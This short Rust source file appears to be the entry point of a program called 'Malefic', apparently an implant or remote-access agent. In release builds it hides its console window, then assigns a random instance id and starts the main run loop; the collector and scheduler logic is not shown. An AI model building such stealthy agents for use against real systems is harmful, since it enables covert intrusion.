#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod meta;
mod common;
mod config;
mod scheduler;
mod collector;
mod malefic;

use rand::{Rng, SeedableRng};
use rand::rngs::OsRng;
use crate::malefic::malefic::Malefic;

#[async_std::main]
async fn main() {
   let mut os_rng = OsRng;
   let seed: [u8; 32] = os_rng.gen();

   let mut rng = rand::rngs::StdRng::from_seed(seed);
   let instance_id: [u8;4];

   if cfg!(debug_assertions) {
      instance_id = [1, 2, 3, 4];
   } else {
      instance_id = rng.gen();
   }

   // let instance_id: [u8; 4] = rng.gen();
   // let test_instance_id :[u8;4] = [1, 2, 3, 4];
   Malefic::run(instance_id).await;
}